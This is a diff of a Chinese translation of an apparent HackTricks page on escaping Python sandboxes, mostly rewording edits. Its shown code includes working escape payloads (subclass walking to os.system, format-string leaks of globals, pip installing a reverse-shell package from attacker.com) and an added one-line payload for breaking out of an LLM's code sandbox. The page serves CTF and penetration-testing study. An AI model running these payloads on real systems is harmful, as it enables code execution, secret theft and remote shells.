@@ -15,7 +15,7 @@
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
 **从黑客的角度审视您的网络应用、网络和云**
 
@@ -60,7 +60,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-记住，_**open**_ 和 _**read**_ 函数可以用于 **读取文件** 在 python 沙箱内，并 **编写一些代码** 你可以 **执行** 来 **绕过** 沙箱。
+记住，_**open**_ 和 _**read**_ 函数可以用于 **读取文件** 在 python 沙箱内，并 **编写一些代码** 你可以 **执行** 以 **绕过** 沙箱。
 
 {% hint style="danger" %}
 **Python2 input()** 函数允许在程序崩溃之前执行 python 代码。
@@ -74,7 +74,7 @@ Python 尝试 **首先从当前目录加载库**（以下命令将打印 python 
 
 ### 默认包
 
-你可以在这里找到 **预安装包的列表**: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+你可以在这里找到 **预安装包的列表**： [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 请注意，从一个 pickle 中你可以使 python 环境 **导入系统中安装的任意库**。\
 例如，以下 pickle 在加载时将导入 pip 库以使用它：
 ```python
@@ -89,13 +89,13 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-有关 pickle 工作原理的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+有关pickle如何工作的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
-### Pip 包
+### Pip包
 
-技巧由 **@isHaacK** 分享
+技巧由**@isHaacK**分享
 
-如果您可以访问 `pip` 或 `pip.main()`，您可以安装任意包并通过调用获得反向 shell:
+如果您可以访问`pip`或`pip.main()`，您可以安装任意包并通过调用获得反向shell:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
@@ -111,7 +111,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ## Eval-ing python code
 
 {% hint style="warning" %}
-请注意，exec 允许多行字符串和“;”，但 eval 不允许（检查海象运算符）
+请注意 exec 允许多行字符串和“;”，但 eval 不允许（检查海象运算符）
 {% endhint %}
 
 如果某些字符被禁止，您可以使用**十六进制/八进制/B64**表示法来**绕过**限制：
@@ -201,11 +201,11 @@ class _:pass
 ```
 ### RCE 创建对象和重载
 
-如果你可以 **声明一个类** 并 **创建该类的对象**，你可以 **编写/覆盖不同的方法**，这些方法可以在 **不需要直接调用它们** 的情况下被 **触发**。
+如果你可以 **声明一个类** 并 **创建该类的对象**，你可以 **编写/覆盖不同的方法**，这些方法可以在 **不需要直接调用它们** 的情况下 **被触发**。
 
 #### 使用自定义类的 RCE
 
-你可以修改一些 **类方法**（_通过覆盖现有类方法或创建一个新类_），使它们在 **触发** 时 **执行任意代码**，而无需直接调用它们。
+你可以修改一些 **类方法**（_通过覆盖现有类方法或创建一个新类_），使它们在 **被触发** 时 **执行任意代码**，而无需直接调用它们。
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -274,7 +274,7 @@ Sub['import os; os.system("sh")']
 ```
 #### 创建带有异常的对象
 
-当**异常被触发**时，**Exception**的一个对象会被**创建**，而无需您直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的一个技巧）：
+当**异常被触发**时，**Exception**的一个对象会被**创建**，而无需您直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的技巧）：
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -340,7 +340,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有的全局函数**（如 `open`、`import`、`print`...）**都没有加载**。\
 然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看起来可能是无害的，但其中一些 **也在内部导入危险** 的功能，可以被访问以获得 **任意代码执行**。
 
-在以下示例中，你可以观察到如何 **滥用** 一些被加载的 "**无害**" 模块，以 **访问** **危险** **功能**。 
+在以下示例中，你可以观察到如何 **滥用** 一些加载的 "**无害**" 模块，以 **访问** **危险** **功能**。 
 
 **Python2**
 ```python
@@ -382,7 +382,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **位置**，您可以找到 **内置函数**。
+[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **地方**，您可以找到 **内置函数**。
 
 #### Python2 和 Python3
 ```python
@@ -424,11 +424,11 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **位置**，您可以找到 **globals**。
+[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 来查找数十/**数百**个 **位置**，您可以找到 **globals**。
 
 ## 发现任意执行
 
-在这里，我想解释如何轻松发现 **更危险的功能** 并提出更可靠的利用方法。
+在这里，我想解释如何轻松发现 **加载的更危险功能** 并提出更可靠的利用。
 
 #### 通过绕过访问子类
 
@@ -467,7 +467,7 @@ defined_func.__class__.__base__.__subclasses__()
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-有很多，**我们只需要一个**来执行命令：
+有很多，我们只需要一个来执行命令：
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
@@ -686,7 +686,7 @@ main()
 
 ## Python 格式字符串
 
-如果您**发送**一个**字符串**给 python，该字符串将被**格式化**，您可以使用 `{}` 来访问**python 内部信息。** 您可以使用之前的示例来访问全局变量或内置函数，例如。
+如果您**发送**一个将要被**格式化**的**字符串**给python，您可以使用`{}`来访问**python内部信息。** 您可以使用之前的示例来访问全局变量或内置函数，例如。
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -706,7 +706,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-注意你可以通过 **点** 的方式正常 **访问属性**，例如 `people_obj.__init__`，而 **字典元素** 则可以用 **括号** 访问，不需要引号 `__globals__[CONFIG]`。
+注意你可以通过 **点** 的方式正常 **访问属性**，例如 `people_obj.__init__`，并且通过 **括号** 访问 **字典元素**，不带引号 `__globals__[CONFIG]`。
 
 还要注意，你可以使用 `.__dict__` 来枚举对象的元素 `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`。
 
@@ -752,18 +752,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
+### LLM Jails bypass
+
+来自 [这里](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
+
 ### 从格式到 RCE 加载库
 
-根据[**这篇文章中的 TypeMonkey 挑战**](https://corgi.rip/posts/buckeye-writeups/)，可以通过利用 Python 中的格式字符串漏洞从磁盘加载任意库。
+根据 [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/)，可以通过利用 Python 中的格式字符串漏洞从磁盘加载任意库。
 
-作为提醒，每当在 Python 中执行某个操作时，都会执行某个函数。例如 `2*3` 将执行 **`(2).mul(3)`** 或 **`{'a':'b'}['a']`** 将是 **`{'a':'b'}.__getitem__('a')`**。
+作为提醒，每次在 Python 中执行操作时，都会执行某个函数。例如 `2*3` 将执行 **`(2).mul(3)`** 或 **`{'a':'b'}['a']`** 将是 **`{'a':'b'}.__getitem__('a')`**。
 
-在[**没有调用的 Python 执行**](./#python-execution-without-calls)部分中还有更多类似的内容。
+在 [**Python execution without calls**](./#python-execution-without-calls) 部分中还有更多类似的内容。
 
-Python 格式字符串漏洞不允许执行函数（不允许使用括号），因此无法像 `'{0.system("/bin/sh")}'.format(os)` 这样获得 RCE。\
+Python 格式字符串漏洞不允许执行函数（不允许使用括号），因此无法像 `'{0.system("/bin/sh")}'.format(os)` 那样获得 RCE。\
 然而，可以使用 `[]`。因此，如果一个常见的 Python 库具有 **`__getitem__`** 或 **`__getattr__`** 方法来执行任意代码，则可以利用它们来获得 RCE。
 
-在 Python 中寻找这样的 gadget，文章提供了这个[**Github 搜索查询**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code)。他发现了这个[例子](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463)：
+在 Python 中寻找这样的 gadget，写作提供了这个 [**Github 搜索查询**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code)。他发现了这个 [一个](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -920,7 +924,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-注意，如果**您无法在python沙箱中导入`dis`**，您可以获取函数的**字节码**（`get_flag.func_code.co_code`）并在本地**反汇编**它。您将看不到正在加载的变量的内容（`LOAD_CONST`），但您可以从（`get_flag.func_code.co_consts`）中推测它们，因为`LOAD_CONST`也会告诉您正在加载的变量的偏移量。
+注意，**如果你无法在python沙箱中导入`dis`**，你可以获取函数的**字节码**（`get_flag.func_code.co_code`）并在本地**反汇编**它。你不会看到正在加载的变量的内容（`LOAD_CONST`），但你可以从（`get_flag.func_code.co_consts`）中推测它们，因为`LOAD_CONST`也会告诉正在加载的变量的偏移量。
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -991,7 +995,7 @@ types.CodeType.__doc__
 ### 重建泄露的函数
 
 {% hint style="warning" %}
-在以下示例中，我们将直接从函数代码对象获取重建函数所需的所有数据。在一个**真实的例子**中，执行函数**`code_type`**所需的所有**值**就是**你需要泄露的**。
+在以下示例中，我们将直接从函数代码对象获取重建函数所需的所有数据。在一个**真实示例**中，执行函数**`code_type`**所需的所有**值**就是**你需要泄露的**内容。
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1005,7 +1009,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### 绕过防御
 
-在本文开头的前几个例子中，您可以看到 **如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以 **在一行中执行整个脚本**，包括循环和其他内容（我们也可以使用 **`exec`** 做同样的事情）。\
+在本文开头的前几个示例中，您可以看到 **如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以 **在一行中执行整个脚本**，包括循环和其他内容（我们也可以使用 **`exec`** 做同样的事情）。\
 无论如何，有时在本地机器上 **创建** 一个 **编译对象** 并在 **CTF 机器** 上执行它可能是有用的（例如，因为我们在 CTF 中没有 `compiled` 函数）。
 
 例如，让我们手动编译并执行一个读取 _./poc.py_ 的函数：
@@ -1045,7 +1049,7 @@ f(42)
 ```
 ## 反编译已编译的 Python
 
-使用像 [**https://www.decompiler.com/**](https://www.decompiler.com) 这样的工具，可以 **反编译** 给定的已编译 Python 代码。
+使用像 [**https://www.decompiler.com/**](https://www.decompiler.com) 这样的工具可以 **反编译** 给定的已编译 Python 代码。
 
 **查看这个教程**：
 
@@ -1058,7 +1062,7 @@ f(42)
 ### 断言
 
 使用参数 `-O` 执行的 Python 将删除断言语句和任何基于 **debug** 值的条件代码。\
-因此，检查像
+因此，像这样的检查
 ```python
 def check_permission(super_user):
 try:
@@ -1078,11 +1082,11 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-**从黑客的角度看待您的网络应用程序、网络和云**
+**从黑客的角度看待您的网络应用、网络和云**
 
-**发现并报告具有实际商业影响的关键可利用漏洞。** 使用我们20多个自定义工具来映射攻击面，查找让您提升权限的安全问题，并使用自动化漏洞收集重要证据，将您的辛勤工作转化为有说服力的报告。
+**查找并报告具有实际业务影响的关键可利用漏洞。** 使用我们20多个自定义工具来映射攻击面，发现让您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
